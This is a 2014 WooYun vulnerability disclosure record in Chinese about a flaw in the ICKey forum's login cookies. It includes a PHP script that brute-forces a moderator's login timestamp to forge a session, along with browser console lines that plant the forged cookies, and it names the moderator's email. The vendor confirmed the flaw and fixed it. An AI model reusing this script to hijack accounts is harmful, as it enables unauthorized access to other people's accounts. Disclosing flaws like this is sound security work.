{"id": 50596, "wybug_id": "wooyun-2014-077385", "wybug_title": "ICKey电子工程师社区登陆机制存在严重缺陷,可导致任意登陆指定账号", "wybug_corp": "ickey.cn", "wybug_author": "小秦", "wybug_date": "2014-09-26 14:47", "wybug_open_date": "2014-11-10 14:48", "wybug_type": "账户体系控制不严", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "认证设计不合理", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-10：\t细节向公众公开  简要描述： ICKey 社区在用户登陆后写入的Cookie, 用于判断账号是否登陆,但写入的内容有严重缺陷,可以很容易就被猜解出来, 导致可以登陆受攻击的目标账号. 详细说明：  ICKey电子工程师社区   http://bbs.ickey.cn/社区登陆的页面:http://bbs.ickey.cn/user-login.html在进行登陆之后, 服务器会下发两个Cookie,一个是 ts_email 对应 用户的账号,一个是 ts_uptime 对应的 用户登陆时的服务器时间(精确到秒),见下图:\n\n后经过检测发现, 后端的程序,检测用户登陆只根据 ts_email和ts_uptime就可以决定.而且既然知道这个值是个时间,那么是否可以大胆猜测,如果要登入另一个人的账号,是不是只要猜对这个账号的登陆时间就可以以这个账号的身份登陆进去呢.下面是检测过程(检测时所使用的账号为论坛里某版主的账号):首先找到一个可以检测用户登陆状态的页面,而且就是可以以最小的费力度来完成的.经过多次检测, 最终以 http://bbs.ickey.cn/user-login-ts-do.html 这个页面下手.当Cookie有效时, 这个页面会返回 302 让你跳到首页去, 如果是无效的, 那么会返回 200, 显示登陆的界面, 所以根据这个特性, 编写如下PHP脚本, 脚本采用HEAD方式, 并把Cookie带上, 对这个页面进行猜解.脚本如下:\n<?phpfunction send($time){\t$opts = array('http' =>\t\tarray(\t\t\t'method'  => 'HEAD',\t\t\t'header'  => 'Cookie: ts_email=shenja%40galaxychn.com; ts_uptime='. $time,\t\t)\t);\t@file_get_contents('http://bbs.ickey.cn/user-login-ts-do.html', false, stream_context_create($opts));\tif(isset($http_response_header) && count($http_response_header) > 0){//如果上面的请求没有出错,则检测结果\t\treturn strpos($http_response_header[0], '302') !== FALSE;\t}\treturn send($time);//有出错,则重试当前值}$I = 1410637162;//猜测用户登陆的时间的开始值while(true){\tif(send($I)){\t\techo \"\\n\\n\\n\",'Find Key: ', $I;\t\tbreak;\t}\t$t = date('Y-m-d H:i:s', $I);\techo \"\\r$I\\t$t\";\t$I++;}\nPS: 上面代码中的 ＼ 被 乌云转换成 ＼＼ 了(在预览的时候看到的),所以在使用的时候把＼＼写成＼,如果真实情况下没看到请忽略本行.在脚本跑了一晚上之后, 得到用户的登陆时间为: 1411608926 (2014-09-25 09:35:25)然后拿这个值,去进行测试,发现已经失效了, 我测试的时间为 2014-09-26 09:10 左右,猜想,可能是这个用户今天又登陆了, 所以挂上脚本以这个时间点,继续往后跑, 结果没跑一会, 结果就出来了(见下图):\n\n接下来就是打开Chrome的隐私模式(没有之前访问的Cookie),以未登陆的状态访问 bbs.ickey.cn然后打开控制台,执行以下代码:\ndocument.cookie='ts_email=shenja%40galaxychn.com; path=/';document.cookie='ts_uptime=1411693828; path=/';\n然后F5一下,\n\n个人信息:\n\n我的私信:\n\n编辑自己发的帖子:\n\n版主交流区:\n\n   漏洞证明：  见上面的详细说明.   修复方案：  你们的程序员应该懂的.   版权声明：转载请注明来源 小秦@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-09-26 17:36 厂商回复： 谢谢,漏洞已经修复. 最新状态： 2014-09-30：已修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}